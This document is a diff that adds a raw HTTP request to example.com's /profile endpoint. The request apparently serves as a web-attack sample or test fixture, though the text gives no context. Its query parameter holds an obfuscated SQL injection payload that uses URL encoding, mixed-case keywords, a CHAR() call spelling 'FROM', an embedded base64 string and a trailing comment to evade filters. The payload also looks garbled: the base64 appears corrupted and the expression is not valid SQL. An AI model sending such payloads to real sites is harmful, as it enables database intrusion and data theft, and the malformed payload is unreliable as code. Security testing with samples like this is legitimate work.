@@ -1,0 +1,6 @@
+GET /profile?query=%27%20oR%20CHAR%2870%2C82%2C79%2C77%29_BaSE64%28%27IGDyb3vWiGJ5IDesMiB3aXRoiHjvBgX1cC0T%27%29-- HTTP/1.1
+Host: example.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
+Accept: */*
+Connection: close
+
